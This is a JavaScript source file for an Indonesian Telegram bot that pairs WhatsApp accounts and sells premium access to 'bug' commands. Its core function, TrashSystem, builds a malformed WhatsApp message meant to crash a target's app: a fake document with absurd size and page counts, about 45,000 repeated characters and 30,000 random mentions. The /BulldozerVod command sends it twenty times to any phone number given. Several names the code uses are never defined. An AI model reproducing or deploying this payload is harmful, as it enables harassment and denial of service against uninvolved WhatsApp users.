const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const {
    loadTokensFromGitHub,
    loadResellersFromGitHub,
    checkReseller,
    checkToken,
    addToken,
    addReseller,
    allowedTokens,
    resellers,
    initializeOctokit,
    verifyBotToken
} = require("./authen");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));


function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");

const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });



async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Instalasii... `,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Try Connect `,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : GAGAL TERHUBUNG`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Berhasil Tersambung❗`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : PAIRING
   └ Kode: ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 
 ✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」
   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : EROR❗❗
   └ Pesan: ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
    console.log("berhasil tersambung");
    await initializeWhatsAppConnections();
}

initializeBot();

// CHECKPOINT 1
// [ BUG FUNCTION ]
    async function TrashSystem(target, rajaimg, Ptcp = true) {
			await Raja.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
								mentionedJid: [target, "13135550002@s.whatsapp.net"],
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: rajaimg,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁踏\n" + "軎�".repeat(45000) + "@0".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁', url: \"https://t.me/RajaModss\", merchant_url: \"https://t.me/RajaModss\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["0@s.whatsapp.net", ...Array.from({
										length: 30000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁"));
		};

		
// [ END FUNCTION ]
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


//=====CASE MENU=======//
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  
  return `${days}𝗗, ${hours}𝗛, ${minutes}𝗠, ${seconds}𝗦`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return "✔";
  } else {
    return "✘";
  }
}

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "✇";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✇";
        return true;
    } else {
        Premiumataubukan = "Ӝ";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ bukan owner");
    }
};

const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  
  bot.sendVideo(chatId, "https://files.catbox.moe/m9ex04.mp4", {  
    caption: `🔧 ᴋʟɪᴋ ᴄᴏᴍᴀɴᴅ sᴇᴠᴇɴᴛʜ ᴅɪʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴜɴᴀᴋᴀɴ ʙᴏᴛ :
> /seventh 
sᴄ ᴍᴀsɪʜ ᴛᴀʜᴀᴘ ᴘᴇʀᴋᴇᴍʙᴀɴɢᴀɴ ᴊᴀᴅɪ ᴋᴀʟᴏ ᴀᴍᴘᴀs ᴍᴀᴋʟᴜᴍɪɴ`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "👤 Owner", url: "https://t.me/NPCmodeSad" }, { text: "👀Info", url: "https://t.me/" }]
      ]
    }
  });
});

// Handler untuk /start
bot.onText(/\/seventh/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    const options = {
        caption: "❌ KAMU BUKAN USER PREMIUM SILAHKAN BELI ACCES PREMIUM DENGAN CARA KLIK TOMBOL BUY ACCES DIBAWAH",
        reply_markup: {
            inline_keyboard: [
                [{ text: "👤 𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/NPCmodeSad" }, { text: "👁️ 𝘐𝘯𝘧𝘰", url: "https://t.me/" }],
                [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/NPCmodeSad" }]
            ]
        }
    };

        return bot.sendVideo(chatId, "https://files.catbox.moe/m9ex04.mp4", options);
}

  bot.sendVideo(chatId, "https://files.catbox.moe/gcouxh.mp4", {  
    caption: `
🜲 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛: 𝐓𝐗𝐑𝟕𝟏𝟕 || 𝚜ᴇᴠᴇɴ 𖥔
🜲 𝙱𝚘𝚝: 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 搾取する
🜲 𝚅𝚎𝚛𝚜𝚒𝚘𝚗: 𝟷𝟶.𝟸 𝚌-𝚘𝚠𝚗𝚎𝚛 𝚘𝚗𝚕𝚢
🜲 𝚃𝚒𝚖𝚎: ${runtime}
         ☄︎ 𝙿𝚎𝚗𝚐𝚐𝚞𝚗𝚊 ☄︎
🜲 𝚂𝚝𝚊𝚝𝚞𝚜: ${premiumStatus}
🜲 𝙽𝚊𝚖𝚎: ${username}
🜲 𝙸𝚍𝚃𝚎𝚕𝚎: ${senderId}

☍ 𝘴𝘦𝘭𝘦𝘤𝘵 𝘵𝘩𝘦 𝘣𝘶𝘵𝘵𝘰𝘯 𝘮𝘦𝘯𝘶 𝘣𝘦𝘭𝘰𝘸`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "[🦠] 𝘉𝘶𝘨 𝘔𝘦𝘯𝘶", callback_data: "bugmenu" }, { text: "[👤] 𝘖𝘸𝘯𝘦𝘳 𝘔𝘦𝘯𝘶", callback_data: "ownermenu" }],
        [{ text: "[❤] 𝘛𝘩𝘢𝘯𝘬𝘴", callback_data: "thanksto" }, { text: "[⚙️] 𝘊𝘰𝘯𝘵𝘳𝘰𝘭 𝘔𝘦𝘯𝘶", callback_data: "controlmenu" }]
      ]
    }
  }).then((sentMessage) => {
    const messageId = sentMessage.message_id;

    bot.on("callback_query", (callbackQuery) => {
      const data = callbackQuery.data;
      let newCaption = "";
      let newButtons = [];

      if (data === "bugmenu") {
        newCaption = `
🜲 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛: 𝐓𝐗𝐑𝟕𝟏𝟕 || 𝚜ᴇᴠᴇɴ 𖥔
🜲 𝙱𝚘𝚝: 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 搾取する
🜲 𝚅𝚎𝚛𝚜𝚒𝚘𝚗: 𝟷𝟶.𝟸 𝚌-𝚘𝚠𝚗𝚎𝚛 𝚘𝚗𝚕𝚢

「𝙱𝚄𝙶 𝙼𝙴𝙽𝚄」
▢ /uixinvis
`;
        newButtons = [
          [{ text: "💎 Back To menu", callback_data: "mainmenu" }]
        ];
      } else if (data === "ownermenu") {
        newCaption = `
🜲 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛: 𝐓𝐗𝐑𝟕𝟏𝟕 || 𝚜ᴇᴠᴇɴ 𖥔
🜲 𝙱𝚘𝚝: 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 搾取する
🜲 𝚅𝚎𝚛𝚜𝚒𝚘𝚗: 𝟷𝟶.𝟸 𝚌-𝚘𝚠𝚗𝚎𝚛 𝚘𝚗𝚕𝚢

   𖤐      『 ᴏᴡɴᴇʀ 』       𖤐
✧ /addprem ( id ) ( 3d )
✧ /addadmin ( id )
✧ /deladmin ( Id )
`;
        newButtons = [
          [{ text: "💎 Back To menu", callback_data: "mainmenu" }]
        ];
      } else if (data === "thanksto") {
        newCaption = `
🜲 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛: 𝐓𝐗𝐑𝟕𝟏𝟕 || 𝚜ᴇᴠᴇɴ 𖥔
🜲 𝙱𝚘𝚝: 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 搾取する
🜲 𝚅𝚎𝚛𝚜𝚒𝚘𝚗: 𝟷𝟶.𝟸 𝚌-𝚘𝚠𝚗𝚎𝚛 𝚘𝚗𝚕𝚢

       『ᴛʜᴀɴᴋs ᴛᴏ』
ɴᴘᴄ ( ᴅᴇᴠᴇʟᴏᴘᴇʀ )
ᴠɪɴᴏ ( ғʀɪᴇɴᴅs ) 
ʀᴀᴘɪ ᴀʜᴍᴀᴅ ( ғʀɪᴇɴᴅs ) 
ᴀʀɪ ( ғʀɪᴇɴᴅs ) 
ʀᴜᴀɴ ᴇᴅᴀɴ ( ғʀɪᴇɴᴅs ) 
`;
        newButtons = [
          [{ text: "💎 Back To menu", callback_data: "mainmenu" }]
        ];
      } else if (data === "controlmenu") {
        newCaption = `
🜲 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛: 𝐓𝐗𝐑𝟕𝟏𝟕 || 𝚜ᴇᴠᴇɴ 𖥔
🜲 𝙱𝚘𝚝: 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 搾取する
🜲 𝚅𝚎𝚛𝚜𝚒𝚘𝚗: 𝟷𝟶.𝟸 𝚌-𝚘𝚠𝚗𝚎𝚛 𝚘𝚗𝚕𝚢

☫ ᴄᴏɴᴛʀᴏʟʟ ☫
✧ /listprem
✧ /setcd 
✧ /addsender 62xxx
✧ /delprem ( id )
✧ /deladmin ( id )
`;
        newButtons = [
          [{ text: "💎 Back To menu", callback_data: "mainmenu" }]
        ];
      } else if (data === "mainmenu") {
        newCaption = `
🜲 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛: 𝐓𝐗𝐑𝟕𝟏𝟕 || 𝚜ᴇᴠᴇɴ 𖥔
🜲 𝙱𝚘𝚝: 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 搾取する
🜲 𝚅𝚎𝚛𝚜𝚒𝚘𝚗: 𝟷𝟶.𝟸 𝚌-𝚘𝚠𝚗𝚎𝚛 𝚘𝚗𝚕𝚢
🜲 𝚃𝚒𝚖𝚎: ${runtime}
         ☄︎ 𝙿𝚎𝚗𝚐𝚐𝚞𝚗𝚊 ☄︎
🜲 𝚂𝚝𝚊𝚝𝚞𝚜: ${premiumStatus}
🜲 𝙽𝚊𝚖𝚎: ${username}
🜲 𝙸𝚍𝚃𝚎𝚕𝚎: ${senderId}

☍ 𝘴𝘦𝘭𝘦𝘤𝘵 𝘵𝘩𝘦 𝘣𝘶𝘵𝘵𝘰𝘯 𝘮𝘦𝘯𝘶 𝘣𝘦𝘭𝘰𝘸`;
        newButtons = [
          [{ text: "[🦠] 𝘉𝘶𝘨 𝘔𝘦𝘯𝘶", callback_data: "bugmenu" }, { text: "[👤] 𝘖𝘸𝘯𝘦𝘳 𝘔𝘦𝘯𝘶", callback_data: "ownermenu" }],
          [{ text: "[💎] 𝘛𝘩𝘢𝘯𝘬𝘴", callback_data: "thanksto" }, { text: "[⚙️] 𝘊𝘰𝘯𝘵𝘳𝘰𝘭 𝘔𝘦𝘯𝘶", callback_data: "controlmenu" }]
        ];
      }

      bot.editMessageCaption(newCaption, {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: newButtons }
      });

      bot.answerCallbackQuery(callbackQuery.id);
    });
  });
});




//=======CASE BUG=========//
let jedaXnish = 1 * 1000; 
let lastExecutionTime = {};

bot.onText(/\/setcd (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const newDelay = parseInt(match[1]) * 1000; 

  if (isNaN(newDelay) || newDelay < 0) {
    return bot.sendMessage(chatId, "❌ Format salah. Gunakan /setjeda <detik> contoh: /setcd 30");
  }

  jedaXnish = newDelay;
  bot.sendMessage(chatId, `✅ Jeda untuk bug berhasil diatur menjadi ${match[1]} detik.`);
});

bot.onText(/\/BulldozerVod (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const mention = Jid
  const target = Jid
  const jid = Jid
  const participant = Jid
  const isTarget = Jid
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᴀᴜᴛʜᴏʀ", url: "https://t.me/NPCmodeSad" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /whatsapp 628xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/kddj06.jpg", {
      caption: `
\`\`\`
𝙵𝙾𝚁𝙼𝙰𝚃
▢ 𝚃𝚊𝚛𝚐𝚎𝚝 : ${formattedNumber}
▢ 𝚃𝚢𝚙𝚎 𝙱𝚞𝚐 : 𝚄𝙸𝚇𝙸𝙽𝚅𝙸𝚂
▢ 𝚂𝚝𝚊𝚝𝚞𝚜 : 𝚜𝚎𝚗𝚍𝚒𝚗𝚐♻️... 
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
   for (let i = 0; i < 20; i++) {
          await TrashSystem(target, rajaimg, Ptcp = true);
          await sleep(5000)
         }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
𝙵𝙾𝚁𝙼𝙰𝚃𝟸
▢ 𝚃𝚊𝚛𝚐𝚎𝚝 : ${formattedNumber}
▢ 𝚃𝚢𝚙𝚎 𝙱𝚞𝚐 :  𝚄𝙸𝚇𝙸𝙽𝚅𝙸𝚂
▢ 𝚂𝚝𝚊𝚝𝚞𝚜 : 𝚂𝚞𝚌𝚌𝚎𝚜✅...
𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃 🎯
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});
// END CASE BUG

//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "❗ ＬＩＳＴ ＰＲＥＭＩＵＭ ❗\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }
